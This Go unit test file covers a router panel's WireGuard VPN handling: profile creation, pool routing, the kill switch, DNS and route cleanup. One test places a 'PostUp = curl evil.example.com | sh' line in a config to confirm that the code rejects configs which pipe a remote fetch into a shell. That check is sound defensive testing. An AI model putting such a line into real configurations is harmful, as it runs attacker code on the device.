package usecase

import (
	"context"
	"encoding/json"
	"errors"
	"net/netip"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/nasnet-community/nasnet-panel-linux/internal/network/domain"
	"github.com/nasnet-community/nasnet-panel-linux/internal/network/system"
	"github.com/nasnet-community/nasnet-panel-linux/pkg/netmark"
	"github.com/nasnet-community/nasnet-panel-linux/pkg/nft"
)

const (
	tPriv = "iNb2CSuC4vfa1UAvOoNGeI9DoLR1s1zCVEfmzHnAHFE="
	tPub  = "Ntq1x3JYRTMHTIfNMpkKCPMBHfJhFtjM2sM82nz0ZW4="
)

// fakeVPNRepo is an in-memory VPNRepository. Real enough for the invariant that
// matters here: exactly one profile is active.
type fakeVPNRepo struct {
	rows   []domain.VPNProfile
	nextID uint
	err    error
}

func (f *fakeVPNRepo) List(context.Context) ([]domain.VPNProfile, error) {
	return f.rows, f.err
}

func (f *fakeVPNRepo) Get(_ context.Context, id uint) (*domain.VPNProfile, error) {
	for i := range f.rows {
		if f.rows[i].ID == id {
			c := f.rows[i]
			return &c, nil
		}
	}
	return nil, errors.New("no such profile")
}

func (f *fakeVPNRepo) Create(_ context.Context, p *domain.VPNProfile) error {
	f.nextID++
	p.ID = f.nextID
	p.Active = false
	f.rows = append(f.rows, *p)
	return nil
}

func (f *fakeVPNRepo) Update(_ context.Context, p *domain.VPNProfile) error {
	for i := range f.rows {
		if f.rows[i].ID == p.ID {
			f.rows[i].Name, f.rows[i].Config = p.Name, p.Config
			return nil
		}
	}
	return errors.New("no such profile")
}

func (f *fakeVPNRepo) Delete(_ context.Context, id uint) error {
	for i := range f.rows {
		if f.rows[i].ID != id {
			continue
		}
		if f.rows[i].Enabled {
			return domain.ErrProfileActive
		}
		f.rows = append(f.rows[:i], f.rows[i+1:]...)
		return nil
	}
	return errors.New("no such profile")
}

func (f *fakeVPNRepo) Active(context.Context) (*domain.VPNProfile, error) {
	if f.err != nil {
		return nil, f.err
	}
	for i := range f.rows {
		if f.rows[i].Active {
			c := f.rows[i]
			return &c, nil
		}
	}
	return nil, nil
}

func (f *fakeVPNRepo) SetActive(_ context.Context, id uint) error {
	found := false
	for i := range f.rows {
		f.rows[i].Active = f.rows[i].ID == id
		if f.rows[i].ID == id {
			found = true
		}
	}
	if !found {
		return errors.New("no such profile")
	}
	return nil
}

func (f *fakeVPNRepo) ClearActive(context.Context) error {
	for i := range f.rows {
		f.rows[i].Active = false
	}
	return nil
}

func (f *fakeVPNRepo) Enabled(context.Context) ([]domain.VPNProfile, error) {
	if f.err != nil {
		return nil, f.err
	}
	var out []domain.VPNProfile
	for i := range f.rows {
		if f.rows[i].Enabled {
			out = append(out, f.rows[i])
		}
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Priority != out[j].Priority {
			return out[i].Priority < out[j].Priority
		}
		return out[i].ID < out[j].ID
	})
	return out, nil
}

func (f *fakeVPNRepo) SetEnabled(_ context.Context, id uint, on bool) error {
	taken := map[int]bool{}
	for i := range f.rows {
		if f.rows[i].Enabled && f.rows[i].WGSlot != nil {
			taken[*f.rows[i].WGSlot] = true
		}
	}
	for i := range f.rows {
		if f.rows[i].ID != id {
			continue
		}
		if !on {
			f.rows[i].Enabled, f.rows[i].WGSlot = false, nil
			return nil
		}
		if f.rows[i].Enabled {
			return nil
		}
		for s := 0; s < domain.MaxEnabledProfiles; s++ {
			if !taken[s] {
				slot := s
				f.rows[i].Enabled, f.rows[i].WGSlot = true, &slot
				return nil
			}
		}
		return domain.ErrPoolFull
	}
	return domain.ErrProfileNotFound
}

func (f *fakeVPNRepo) SetRole(_ context.Context, id uint, priority, weight int) error {
	if err := domain.ValidatePoolRole(priority, weight); err != nil {
		return err
	}
	for i := range f.rows {
		if f.rows[i].ID == id {
			f.rows[i].Priority, f.rows[i].Weight = priority, weight
			return nil
		}
	}
	return domain.ErrProfileNotFound
}

func (f *fakeVPNRepo) SetTransport(_ context.Context, id uint, uplinkKey string) error {
	for i := range f.rows {
		if f.rows[i].ID == id {
			f.rows[i].TransportUplink = uplinkKey
			return nil
		}
	}
	return domain.ErrProfileNotFound
}

func (f *fakeVPNRepo) SetPool(_ context.Context, want []domain.VPNProfile) error {
	for i := range f.rows {
		f.rows[i].Enabled, f.rows[i].WGSlot = false, nil
	}
	for _, w := range want {
		for i := range f.rows {
			if f.rows[i].ID == w.ID {
				f.rows[i].Enabled, f.rows[i].WGSlot = true, w.WGSlot
				f.rows[i].Priority, f.rows[i].Weight = w.Priority, w.Weight
				f.rows[i].Config = w.Config
			}
		}
	}
	return nil
}

// fakeDoH answers with a fixed address, or refuses.
type fakeDoH struct {
	addr  string
	err   error
	calls int
}

func (f *fakeDoH) Resolve(context.Context, string) (netip.Addr, error) {
	f.calls++
	if f.err != nil {
		return netip.Addr{}, f.err
	}
	return netip.MustParseAddr(f.addr), nil
}

func wgConfigJSON(t *testing.T, mutate func(*domain.WireGuardConfig)) string {
	t.Helper()
	cfg := domain.WireGuardConfig{
		PrivateKey: tPriv,
		Address:    "10.66.0.2/32",
		Peer: domain.WGPeerConfig{
			PublicKey:  tPub,
			AllowedIPs: []string{"0.0.0.0/0"},
			Endpoint:   "vpn.example.com:51820",
		},
	}
	if mutate != nil {
		mutate(&cfg)
	}
	b, err := json.Marshal(cfg)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// stubGroupRepo is enough for Reconcile to run: the routing-rule shapes are
// proved in rules_test, not here.
type stubGroupRepo struct{ groups []domain.WANGroup }

func (s *stubGroupRepo) List(context.Context) ([]domain.WANGroup, error) { return s.groups, nil }
func (s *stubGroupRepo) GetByName(context.Context, string) (*domain.WANGroup, error) {
	return nil, nil
}
func (s *stubGroupRepo) Members(context.Context, uint) ([]domain.WANGroupMember, error) {
	return nil, nil
}
func (s *stubGroupRepo) EnsureDefaults(context.Context) error { return nil }
func (s *stubGroupRepo) SetMember(context.Context, uint, uint, int, uint32) error {
	return nil
}

type vpnFixture struct {
	uc   *networkUsecase
	repo *fakeVPNRepo
	wg   *system.FakeWGDevice
	doh  *fakeDoH
	be   *system.FakeBackend
	nft  *nft.Manager
}

func newVPNFixture(t *testing.T) *vpnFixture {
	t.Helper()
	f := &vpnFixture{
		repo: &fakeVPNRepo{},
		wg:   &system.FakeWGDevice{},
		doh:  &fakeDoH{addr: "185.65.135.1"},
		be:   system.NewFakeBackend(),
		nft:  nft.NewManager(&nft.FakeApplier{}),
	}
	f.uc = &networkUsecase{Deps: Deps{
		VPNRepo:    f.repo,
		WG:         f.wg,
		DoH:        f.doh,
		Backend:    f.be,
		Nft:        f.nft,
		IfRepo:     &stubIfRepo{},
		GroupRepo:  &stubGroupRepo{},
		RouterMode: true,
	}}
	return f
}

// One bad row used to empty the whole tab, bad row included.
func TestListVPNProfiles_OneBadRowDoesNotHideTheOthers(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "broken", Type: domain.VPNTypeWireGuard, Config: "not json"},
		{ID: 2, Name: "frankfurt", Type: domain.VPNTypeWireGuard,
			Config: `{"private_key":"` + tPriv + `","address":"10.66.0.2/32",` +
				`"peer":{"public_key":"` + tPub + `","endpoint":"1.2.3.4:51820","allowed_ips":["0.0.0.0/0"]}}`},
	}

	got, err := f.uc.ListVPNProfiles(context.Background())
	if err != nil {
		t.Fatalf("one unreadable row failed the whole list: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("got %d profiles, want both listed", len(got))
	}
	if got[0].Unreadable == "" {
		t.Error("the unreadable row is not marked, so the UI cannot explain it")
	}
	if got[1].Unreadable != "" || got[1].Config.Peer.Endpoint != "1.2.3.4:51820" {
		t.Errorf("the good row came back wrong: %+v", got[1])
	}
}

func TestCreateVPNProfile_FromAPastedURI(t *testing.T) {
	f := newVPNFixture(t)
	raw := "wireguard://" + strings.ReplaceAll(tPriv, "/", "%2F") + "@1.2.3.4:51820" +
		"?publickey=" + strings.ReplaceAll(tPub, "/", "%2F") + "&address=10.66.0.2/32#Berlin"

	v, err := f.uc.CreateVPNProfile(context.Background(), CreateVPNProfileRequest{Raw: raw})
	if err != nil {
		t.Fatal(err)
	}
	// The fragment names it, so pasting is the whole interaction.
	if v.Name != "Berlin" {
		t.Errorf("name = %q", v.Name)
	}
	if v.Config.PrivateKey != tPriv {
		t.Errorf("private key = %q", v.Config.PrivateKey)
	}
	// The public half is derived so the operator can paste it into their server.
	if v.PublicKey == "" {
		t.Error("no derived public key")
	}
	if v.Enabled {
		t.Error("creating a profile put it in the pool")
	}
}

func TestCreateVPNProfile_RefusesAScriptedConfig(t *testing.T) {
	f := newVPNFixture(t)
	conf := "[Interface]\nPrivateKey = " + tPriv + "\nAddress = 10.66.0.2/32\n" +
		"PostUp = curl evil.example.com | sh\n\n[Peer]\nPublicKey = " + tPub +
		"\nEndpoint = 1.2.3.4:51820\n"

	_, err := f.uc.CreateVPNProfile(context.Background(), CreateVPNProfileRequest{Name: "x", Raw: conf})
	if !errors.Is(err, domain.ErrScriptKey) {
		t.Fatalf("err = %v, want ErrScriptKey", err)
	}
	if len(f.repo.rows) != 0 {
		t.Error("a rejected config was stored anyway")
	}
}

func testApplier(t *testing.T, p system.Paths) *system.Applier {
	t.Helper()
	return &system.Applier{Snap: newTestSnapshotter(t, p), Repo: &stubApplyRepo{},
		Paths: p, Reload: func(context.Context) error { return nil }, Now: time.Now}
}

func slotOf(n int) *int { return &n }

func TestEnableVPNProfile_BringsTheTunnelUpAndPinsTheEndpoint(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = testApplier(t, f.uc.Paths)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Weight: 1, Config: wgConfigJSON(t, nil)}}

	verdicts, view, err := f.uc.EnableVPNProfile(ctx, 1)
	if err != nil {
		t.Fatal(err)
	}
	if domain.Rejected(verdicts) {
		t.Fatalf("rejected: %+v", verdicts)
	}
	if view == nil {
		t.Fatal("no apply view, so nothing armed the auto-revert")
	}

	st := f.wg.State("nasnet-wg0")
	if st == nil || st.Applied == nil {
		t.Fatal("the tunnel interface was never configured")
	}
	// The pin is what keeps WireGuard's own handshakes off the domestic line.
	if st.Applied.FirewallMark != netmark.PinMark(2) {
		t.Errorf("firewall mark = 0x%08x, want the secondary pin", st.Applied.FirewallMark)
	}
	// A silent config still has to survive CGNAT.
	if st.Applied.MTU != domain.DefaultWGMTU {
		t.Errorf("MTU = %d, want the default", st.Applied.MTU)
	}
	if st.Applied.Keepalive != time.Duration(domain.DefaultWGKeepalive)*time.Second {
		t.Errorf("keepalive = %v, want the default", st.Applied.Keepalive)
	}
	// Resolved once, at enable, because the resolver is about to move inside.
	if st.Applied.Endpoint.String() != "185.65.135.1:51820" {
		t.Errorf("endpoint = %v, want the resolved address", st.Applied.Endpoint)
	}

	stored, _ := f.repo.Get(ctx, 1)
	var cfg domain.WireGuardConfig
	if err := json.Unmarshal([]byte(stored.Config), &cfg); err != nil {
		t.Fatal(err)
	}
	if cfg.PinnedEndpointIP != "185.65.135.1" {
		t.Errorf("pinned endpoint = %q, so the tunnel could not come up without a resolver", cfg.PinnedEndpointIP)
	}
	if !stored.Enabled || stored.WGSlot == nil || *stored.WGSlot != 0 {
		t.Errorf("stored row = %+v, want enabled in slot 0", stored)
	}
}

func TestEnableVPNProfile_SecondMemberJoinsThePool(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = testApplier(t, f.uc.Paths)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 3, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)},
		{ID: 2, Name: "b", Weight: 1, Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
			c.Address = "10.66.1.2/32"
			c.Peer.Endpoint = "5.6.7.8:51820"
		})},
	}

	verdicts, view, err := f.uc.EnableVPNProfile(ctx, 2)
	if err != nil || domain.Rejected(verdicts) || view == nil {
		t.Fatalf("err=%v verdicts=%+v view=%v", err, verdicts, view)
	}
	if f.wg.State("nasnet-wg1") == nil {
		t.Fatal("the new member's device never came up")
	}
	// Route assertions live against applyVPNRoutes: the fixture has no uplink
	// rows, so Reconcile inside the plan stops before routing.
	if err := f.uc.applyVPNRoutes(ctx, f.uc.vpnPoolNow(ctx), twoUplinks()); err != nil {
		t.Fatal(err)
	}
	routes, _ := f.be.RouteList(ctx, system.WGTable)
	var def *system.Route
	probes := map[int]string{}
	for i := range routes {
		switch {
		case routes[i].Dest == "default" && routes[i].Metric == 0:
			def = &routes[i]
		case routes[i].Dest == "default":
			probes[routes[i].Metric] = routes[i].OifName
		}
	}
	if def == nil || len(def.Nexthops) != 2 ||
		def.Nexthops[0] != (system.Nexthop{OifName: "nasnet-wg0", Weight: 3}) ||
		def.Nexthops[1] != (system.Nexthop{OifName: "nasnet-wg1", Weight: 1}) {
		t.Fatalf("pool default = %+v", def)
	}
	if probes[100] != "nasnet-wg0" || probes[101] != "nasnet-wg1" {
		t.Fatalf("probe routes = %v", probes)
	}
}

// The whole feature, stated once: an unresolvable endpoint changes nothing.
func TestEnableVPNProfile_UnresolvableEndpointRejectsAndAppliesNothing(t *testing.T) {
	f := newVPNFixture(t)
	f.doh.err = errors.New("no answer")
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Weight: 1, Config: wgConfigJSON(t, nil)}}

	verdicts, view, err := f.uc.EnableVPNProfile(context.Background(), 1)
	if err != nil {
		t.Fatal(err)
	}
	if !domain.Rejected(verdicts) {
		t.Fatalf("verdicts = %+v, want a reject", verdicts)
	}
	if view != nil {
		t.Error("something was applied despite the reject")
	}
	if f.wg.State("nasnet-wg0") != nil {
		t.Error("the tunnel came up despite the reject")
	}
	if f.repo.rows[0].Enabled {
		t.Error("the profile joined the pool despite the reject")
	}
}

// A pool member carries the default route or it carries nothing anyone asked
// for; the old single-tunnel warning is a hard reject now.
func TestEnableVPNProfile_HardRejects(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	base := wgConfigJSON(t, nil)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0), Config: base},
		{ID: 2, Name: "narrow", Weight: 1, Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
			c.Peer.AllowedIPs = []string{"10.0.0.0/8"}
		})},
		{ID: 3, Name: "same-addr", Weight: 1, Config: base},
		{ID: 4, Name: "same-port", Weight: 1, Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
			c.Address = "10.66.2.2/32"
			c.ListenPort = 51821
		})},
	}
	// Give the enabled member the same listen port so ID 4 collides.
	f.repo.rows[0].Config = wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.ListenPort = 51821 })

	for _, tc := range []struct {
		id   uint
		rule string
	}{{2, "V32"}, {3, "V36"}, {4, "V35"}} {
		verdicts, view, err := f.uc.EnableVPNProfile(ctx, tc.id)
		if err != nil {
			t.Fatalf("id %d: %v", tc.id, err)
		}
		if !domain.Rejected(verdicts) || !hasVerdict(verdicts, tc.rule) {
			t.Errorf("id %d: verdicts = %+v, want a %s reject", tc.id, verdicts, tc.rule)
		}
		if view != nil {
			t.Errorf("id %d: applied despite the reject", tc.id)
		}
	}
}

// Provisioning before the dish arrives is a real workflow.
func TestEnableVPNProfile_NoSecondaryUplinkWarnsButApplies(t *testing.T) {
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = testApplier(t, f.uc.Paths)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Weight: 1, Config: wgConfigJSON(t, nil)}}

	verdicts, view, err := f.uc.EnableVPNProfile(context.Background(), 1)
	if err != nil {
		t.Fatal(err)
	}
	if !hasVerdict(verdicts, "V33") {
		t.Errorf("no warning about the missing uplink: %+v", verdicts)
	}
	if domain.Rejected(verdicts) || view == nil {
		t.Error("refused to pre-provision")
	}
}

func TestDisableVPNProfile_TakesTheMemberDown(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.uc.Paths = testPaths(t)
	f.uc.applier = testApplier(t, f.uc.Paths)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)},
		{ID: 2, Name: "b", Enabled: true, Weight: 1, WGSlot: slotOf(1),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.Address = "10.66.1.2/32" })},
	}
	if err := f.uc.applyVPNDevices(ctx); err != nil {
		t.Fatal(err)
	}

	if _, _, err := f.uc.DisableVPNProfile(ctx, 2); err != nil {
		t.Fatal(err)
	}
	if f.repo.rows[1].Enabled {
		t.Error("the profile is still in the pool")
	}
	if f.wg.Deleted["nasnet-wg1"] == 0 {
		t.Error("the member's interface survived the disable")
	}
	if f.wg.State("nasnet-wg0") == nil {
		t.Error("the disable took the other member down with it")
	}
}

func TestSetVPNProfileRole_RewritesTheNexthopsWithoutAPlan(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Priority: 0, Weight: 1, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)},
		{ID: 2, Name: "b", Enabled: true, Priority: 0, Weight: 1, WGSlot: slotOf(1),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.Address = "10.66.1.2/32" })},
	}

	if err := f.uc.SetVPNProfileRole(ctx, 2, 1, 5); err != nil {
		t.Fatal(err)
	}
	routes, _ := f.be.RouteList(ctx, system.WGTable)
	for _, r := range routes {
		if r.Dest == "default" && r.Metric == 0 {
			if len(r.Nexthops) != 1 || r.Nexthops[0].OifName != "nasnet-wg0" {
				t.Fatalf("tier 1 member still in the tier-0 set: %+v", r.Nexthops)
			}
			return
		}
	}
	t.Fatal("no pool default found")
}

func TestSetVPNProfileRole_RejectsBadRanges(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "a", Weight: 1, Config: wgConfigJSON(t, nil)}}
	if err := f.uc.SetVPNProfileRole(context.Background(), 1, 9, 1); !errors.Is(err, ErrValidationFailed) {
		t.Errorf("priority 9: err = %v", err)
	}
	if err := f.uc.SetVPNProfileRole(context.Background(), 1, 0, 0); !errors.Is(err, ErrValidationFailed) {
		t.Errorf("weight 0: err = %v", err)
	}
}

func TestPoolNexthops_TiersWeightsAndTheLastMemberRule(t *testing.T) {
	cases := []struct {
		name    string
		members []poolMember
		want    []system.Nexthop
	}{
		{"weighted tier zero",
			[]poolMember{{IfName: "nasnet-wg0", Priority: 0, Weight: 3, Healthy: true},
				{IfName: "nasnet-wg1", Priority: 0, Weight: 1, Healthy: true},
				{IfName: "nasnet-wg2", Priority: 1, Weight: 1, Healthy: true}},
			[]system.Nexthop{{OifName: "nasnet-wg0", Weight: 3}, {OifName: "nasnet-wg1", Weight: 1}}},
		{"dead member ejected from its tier",
			[]poolMember{{IfName: "nasnet-wg0", Priority: 0, Weight: 3, Healthy: false},
				{IfName: "nasnet-wg1", Priority: 0, Weight: 1, Healthy: true}},
			[]system.Nexthop{{OifName: "nasnet-wg1", Weight: 1}}},
		{"tier zero all dead falls to tier one",
			[]poolMember{{IfName: "nasnet-wg0", Priority: 0, Weight: 1, Healthy: false},
				{IfName: "nasnet-wg1", Priority: 1, Weight: 1, Healthy: true}},
			[]system.Nexthop{{OifName: "nasnet-wg1", Weight: 1}}},
		{"everything dead keeps the best tier routed",
			[]poolMember{{IfName: "nasnet-wg0", Priority: 0, Weight: 2, Healthy: false},
				{IfName: "nasnet-wg1", Priority: 1, Weight: 1, Healthy: false}},
			[]system.Nexthop{{OifName: "nasnet-wg0", Weight: 2}}},
		{"empty pool", nil, nil},
	}
	for _, tc := range cases {
		got := poolNexthops(tc.members)
		if len(got) != len(tc.want) {
			t.Fatalf("%s: got %v want %v", tc.name, got, tc.want)
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Errorf("%s: got %v want %v", tc.name, got, tc.want)
			}
		}
	}
}

func TestDeleteVPNProfile_RefusedWhileEnabled(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Enabled: true, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)}}
	if err := f.uc.DeleteVPNProfile(context.Background(), 1); !errors.Is(err, domain.ErrProfileActive) {
		t.Errorf("err = %v, want ErrProfileActive", err)
	}
}

func TestUpdateVPNProfile_RefusedWhileEnabled(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Enabled: true, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)}}
	_, err := f.uc.UpdateVPNProfile(context.Background(), 1,
		CreateVPNProfileRequest{Name: "x", Config: &domain.WireGuardConfig{}})
	if !errors.Is(err, ErrValidationFailed) {
		t.Errorf("err = %v, want a validation failure", err)
	}
}

// A tunnel is up or it is not, and the only evidence either way is a handshake.
func TestVPNStatus_HandshakeAgeDecidesConnected(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Enabled: true, Weight: 1, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)}}
	if err := f.uc.applyVPNDevices(ctx); err != nil {
		t.Fatal(err)
	}

	f.wg.State(system.WGLinkName).Stat = &system.WGStatus{
		LastHandshake: time.Now().Add(-30 * time.Second), RxBytes: 10, TxBytes: 20}
	st, err := f.uc.VPNStatus(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if len(st.Tunnels) != 1 {
		t.Fatalf("tunnels = %+v", st.Tunnels)
	}
	tn := st.Tunnels[0]
	if !tn.Connected || tn.RxBytes != 10 || tn.TxBytes != 20 {
		t.Errorf("status = %+v", tn)
	}
	if tn.HandshakeAgeSecs == nil || *tn.HandshakeAgeSecs < 25 {
		t.Errorf("handshake age = %v", tn.HandshakeAgeSecs)
	}
	if !st.KillSwitch {
		t.Error("the kill switch is reported as off; it is not a setting")
	}
	// Defaults have to be reported as applied, or the UI shows a blank MTU.
	if tn.MTU != domain.DefaultWGMTU || tn.KeepaliveSecs != domain.DefaultWGKeepalive {
		t.Errorf("mtu = %d keepalive = %d", tn.MTU, tn.KeepaliveSecs)
	}

	f.wg.State(system.WGLinkName).Stat = &system.WGStatus{
		LastHandshake: time.Now().Add(-system.StaleHandshakeAfter - time.Second)}
	st, err = f.uc.VPNStatus(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if st.Tunnels[0].Connected {
		t.Error("a tunnel with a stale handshake reported as connected")
	}
}

func TestVPNStatus_EmptyPoolIsNotAnError(t *testing.T) {
	st, err := newVPNFixture(t).uc.VPNStatus(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(st.Tunnels) != 0 {
		t.Errorf("status = %+v", st)
	}
	if !st.KillSwitch {
		t.Error("with no pool the kill switch is exactly what is holding")
	}
}

// The tunnels do not survive a reboot, so boot has to put them back.
func TestApplyVPNDevices_RebuildsFromTheStoredPool(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })},
		{ID: 2, Name: "b", Enabled: true, Weight: 1, WGSlot: slotOf(1),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
				c.Address = "10.66.1.2/32"
				c.PinnedEndpointIP = "5.6.7.8"
			})},
	}

	if err := f.uc.applyVPNDevices(ctx); err != nil {
		t.Fatal(err)
	}
	if f.wg.State("nasnet-wg0") == nil || f.wg.State("nasnet-wg1") == nil {
		t.Fatal("the pool was not rebuilt")
	}
	// Straight from the pins: at boot there may be no resolver at all yet.
	if f.doh.calls != 0 {
		t.Errorf("boot made %d DNS lookups; the pinned addresses are there so it needs none", f.doh.calls)
	}
}

// A link whose profile left the pool must not keep answering.
func TestApplyVPNDevices_RemovesOrphanedLinks(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	_ = f.wg.Ensure(ctx, "nasnet-wg3", system.WGApplyConfig{})
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0),
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })}}

	if err := f.uc.applyVPNDevices(ctx); err != nil {
		t.Fatal(err)
	}
	if f.wg.State("nasnet-wg3") != nil {
		t.Error("an orphaned tunnel link survived the reconcile")
	}
}

// A failed read used to pass for a clean teardown.
func TestApplyVPNRoutes_AFailedReadIsNotAnEmptyTable(t *testing.T) {
	f := newVPNFixture(t)
	f.be.Err = errors.New("netlink is busy")

	err := f.uc.applyVPNRoutes(context.Background(), vpnPool{}, twoUplinks())
	if err == nil {
		t.Fatal("a failed routing-table read was reported as a successful teardown")
	}
}

// An unreadable config must read as "no tunnel", which blackholes, rather than
// as "no kill switch", which leaks.
func TestVPNRouteState_FailsTowardsTheBlackhole(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Enabled: true, WGSlot: slotOf(0), Config: "not json"}}
	if f.uc.vpnRouteState(context.Background()).Active() {
		t.Error("an unreadable profile still routed traffic into a tunnel that cannot exist")
	}

	f.repo.err = errors.New("database is gone")
	if f.uc.vpnRouteState(context.Background()).Active() {
		t.Error("a database failure was read as a working tunnel")
	}
}

func TestPoolForeignDNS_OneLinePerMember(t *testing.T) {
	// The provider's own resolver is the one guaranteed to answer inside their
	// tunnel, so it wins when they name one; the default fills the rest.
	pool := vpnPool{Tunnels: []tunnel{
		{Profile: &domain.VPNProfile{ID: 1}, Config: &domain.WireGuardConfig{DNS: "10.64.0.1"}, IfName: "nasnet-wg0"},
		{Profile: &domain.VPNProfile{ID: 2}, Config: &domain.WireGuardConfig{}, IfName: "nasnet-wg1"},
	}}
	got := poolForeignDNS(pool)
	if len(got) != 2 {
		t.Fatalf("got %+v", got)
	}
	if got[0].Server != "10.64.0.1" || got[0].IfName != "nasnet-wg0" {
		t.Errorf("got[0] = %+v", got[0])
	}
	if got[1].Server != DefaultForeignDNS || got[1].IfName != "nasnet-wg1" {
		t.Errorf("got[1] = %+v", got[1])
	}

	// With no pool there is nowhere honest to send a foreign query: a
	// plaintext one out the raw uplink is the leak this feature exists to stop.
	if got := poolForeignDNS(vpnPool{}); len(got) != 0 {
		t.Errorf("got %+v, want nothing", got)
	}
}

func TestApplyVPNRoutes_DishStaysReachable(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0),
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })}}

	if err := f.uc.applyVPNRoutes(ctx, f.uc.vpnPoolNow(ctx), twoUplinks()); err != nil {
		t.Fatal(err)
	}
	routes, _ := f.be.RouteList(ctx, system.WGTable)
	var haveDish bool
	for _, r := range routes {
		if r.Dest == StarlinkDishSubnet && r.OifName == "enp2s0" && r.Scope == "link" {
			haveDish = true
		}
	}
	if !haveDish {
		t.Error("the dish's own address became unreachable")
	}
}

// A stale default pointing at a device that is gone is worse than an empty
// table: it is a black hole that looks like a route.
func TestApplyVPNRoutes_ClearsTheTableWhenThePoolIsEmpty(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	seed := []system.Route{
		{Table: system.WGTable, Dest: "default",
			Nexthops: []system.Nexthop{{OifName: system.WGLinkName, Weight: 1}}},
		{Table: system.WGTable, Dest: "default", OifName: system.WGLinkName, Metric: probeRouteMetric},
		{Table: system.WGTable, Dest: StarlinkDishSubnet, OifName: "enp2s0", Scope: "link"},
	}
	for _, r := range seed {
		if err := f.be.RouteReplace(ctx, r); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.uc.applyVPNRoutes(ctx, vpnPool{}, twoUplinks()); err != nil {
		t.Fatal(err)
	}
	left, err := f.be.RouteList(ctx, system.WGTable)
	if err != nil {
		t.Fatal(err)
	}
	if len(left) != 0 {
		t.Errorf("routes survived the pool: %+v", left)
	}
}

func TestApplyKillSwitchState_ArmsOnTheSecondaryUplink(t *testing.T) {
	ctx := context.Background()
	m := nft.NewManager(&nft.FakeApplier{})
	if err := ApplyKillSwitchState(ctx, m, twoUplinks(),
		map[string]string{"enp2s0": "100.64.0.1"},
		DefaultHealthConfig().probeExemptIPs()); err != nil {
		t.Fatal(err)
	}
	k := m.Snapshot().KillSwitch
	if k == nil {
		t.Fatal("no kill switch")
	}
	if len(k.Legs) != 1 {
		t.Fatalf("%d legs, want one for the only secondary", len(k.Legs))
	}
	if k.Legs[0].IfName != "enp2s0" || k.Legs[0].GatewayIP != "100.64.0.1" {
		t.Errorf("kill switch = %+v", k.Legs[0])
	}
	if k.Legs[0].PinValue != netmark.PinMark(2) || k.MarkMask != netmark.MaskPin {
		t.Errorf("mark = 0x%08x/0x%08x, want the secondary pin", k.Legs[0].PinValue, k.MarkMask)
	}
	if len(k.BootstrapIPs) == 0 {
		t.Error("no bootstrap addresses, so an endpoint hostname could never resolve")
	}
	if k.ProbeMark != netmark.PinMark(netmark.PinProbe) {
		t.Errorf("probe mark = 0x%08x, want the probe pin", k.ProbeMark)
	}
